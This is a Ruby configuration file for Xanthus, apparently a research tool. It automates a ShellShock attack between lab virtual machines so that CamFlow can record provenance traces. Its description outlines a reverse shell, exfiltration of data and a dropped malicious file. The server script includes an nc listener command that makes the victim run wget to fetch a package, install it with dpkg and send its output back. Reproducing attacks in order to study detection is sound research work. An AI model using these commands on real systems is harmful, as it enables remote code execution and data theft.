# -*- mode: ruby -*-
# vi: set ft=ruby


# -*- mode: ruby -*-
# vi: set ft=ruby

Xanthus.configure do |config|
  config.name = 'shellshock'
  config.authors = 'Xueyuan Michael Han'
  config.description = %q{
A simple ShellShock example to demonstrate:

* Xanthus' ability to reproduce different types of attacks

A standard Ubuntu 18.04 server is listening at port 8080.
A victim machine monitored by CamFlow is given a maliciously-formatted bash function definition with trailing code.
The code is executed and opens up a connection with the server.
The spawned bash session on the victim because of the bash vulnerability takes standard input from the server,
which is echoed by the server to be "uname -r ; ls".
The standard output and standard error are also sent to the server, so essentially,
a reverse TCP shell is created where any command provided by the server will be executed on the victim,
and the results of the command will be sent to the server.
Secret information of the victim machine is therefore exfiltrated.
The attacker also create a new file `.bad_configrc` in the victim machine.
The file can be a cronjob that further creates damage.

In this example, we redirect the output of the commands to a temporary file called "secrets.txt"
to demonstrate that information was indeed exfiltrated.

Everything is done automatically through scripts for reproducility with minimum human interaction.
}
  config.seed = 43670961620410975231081934347800654831

  config.script :camflow_start do
    Xanthus::CAMFLOW_START
  end

  config.script :normal do
    %q{%{
      sudo chmod 777 /vagrant/install.sh
      /vagrant/install.sh
    }}
  end

  config.script :attack do
    %q{%{
      sudo chmod 777 /vagrant/bad_install.sh
      /vagrant/bad_install.sh
    }}
  end

  config.script :camflow_stop do
    Xanthus::CAMFLOW_STOP
  end

  config.script :server do
    %q{%{
      sudo apt-get -y update
      sudo apt-get -y install build-essential
      sudo apt-get -y install python-pip python-dev
      sudo pip install pyftpdlib

      mkdir /tmp/ftptest
      cd /tmp/ftptest
      cp /vagrant/ipscan_3.5.5_amd64.deb /tmp/ftptest
      sudo python -m pyftpdlib -p21 -w &
      sleep 5
      echo "uname -r ; ls ; wget ftp://anonymous@192.168.33.3:21/ipscan_3.5.5_amd64.deb ; sudo dpkg -i ipscan_3.5.5_amd64.deb ; exit" | nc -l 8585 > /tmp/secrets.txt &
      sleep 5
    }}
  end

  config.vm :camflow do |vm|
    vm.box = 'michaelh/ubuncam'
    vm.version = '0.0.3'
    vm.ip = '192.168.33.8'
  end

  config.vm :server do |vm|
    vm.box = 'bento/ubuntu-18.04'
    vm.version = '201812.27.0'
    vm.ip = '192.168.33.3'
  end

  config.job :attack_camflow do |job|
    job.iterations = 25
    job.tasks = {server: [:server], camflow: [:camflow_start, :attack, :camflow_stop]}
    job.inputs = {server: ['ipscan_3.5.5_amd64.deb'], camflow: ['bad_install.sh']}
    job.outputs = {server: {trace: '/tmp/secrets.txt'}, camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
  end

  config.github do |github|
    github.repo = 'tfjmp/shell-shock'
		github.token = 'REMOVED'
  end
end
